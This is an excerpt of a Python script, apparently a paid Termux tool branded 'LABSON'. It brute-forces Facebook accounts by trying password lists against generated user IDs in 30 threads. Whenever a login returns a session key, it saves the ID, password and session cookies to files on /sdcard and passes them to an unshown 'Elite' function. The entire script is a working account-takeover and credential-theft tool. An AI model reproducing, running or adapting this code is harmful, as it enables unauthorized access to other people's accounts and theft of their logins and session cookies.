...
try:
        ...
        os.system('python #346800.py')
except:pass
def LABSON(ids,pas,cookie):
    try:
        import requests
...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using LABSON');exit()
...
| $$     \\$$    $$| $$    $$|       $$ \$$    $$| $$  | $$
 ...
 ┃𝐅𝐁 𝐈𝐃:LABSON POUDEL          ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:2.4      ┃
 ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
 ┃𝐆𝐈𝐓𝐇𝐔𝐁:Div.txt       ┃ 𝐓𝐎𝐎𝐋 : paid   |
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
...
def npxind():
                ...
                with tred(max_workers=30) as HANDSOME:     
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    LABSON.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    LABSON.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as LABSON:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [LABSON BABY-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [LABSON BABY-OK] '+ids+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/LABSON BABY_M1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOME_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [LABSON BABY-CP] '+ids+' | '+pas+'\033[1;97m')
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [LABSON BABY-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                    ...
                                    #    print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/LABSON_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LABSON_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [LABSON BABY-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                      ...
                                      #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                        print('\r\r\033[1;32m [LABSON-OK] '+ids+' | '+pas+'\033[1;97m')
                                     #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/LABSON_M3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LABSON_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [BABY-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BABY-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LABSON-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/🍪.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
